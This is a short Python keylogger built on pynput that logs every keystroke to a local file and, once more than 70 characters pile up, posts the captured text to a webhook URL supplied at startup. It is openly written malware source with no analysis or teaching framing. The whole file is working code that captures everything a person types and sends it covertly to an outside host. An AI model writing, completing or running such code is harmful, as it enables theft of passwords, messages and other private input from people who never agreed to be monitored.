from pynput import keyboard
import logging
import threading
import requests

log = []
webhook_url = ""  # Global variable to store the webhook URL

def on_press(key):
    global log
    logging.basicConfig(filename='keylogger.txt', level=logging.DEBUG, format='%(message)s')
    try:
        logging.log(10, key.char)
        log.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log.append(' ')
        elif key == keyboard.Key.enter:
            log.append('[Enter]')
        elif key == keyboard.Key.tab:
            log.append('[Tab]')
        elif key == keyboard.Key.esc:
            log.append('[Esc]')
        elif key == keyboard.Key.backspace:
            log.append('[Backspace]')
        else:
            log.append(f'[{key}]')
    send_logs()

def send_logs():
    global log
    if len(log) > 70:
        log_content = "".join(log)
        requests.post(webhook_url, json={"content": log_content})
        log = []

def start_keylogger(url):
    global webhook_url
    webhook_url = url

    # Sets the hook on keyboard events and captures the key presses
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Sends the logs to the webhook
    threading.Timer(12, send_logs).start()

    # Keep the program running
    listener.join()
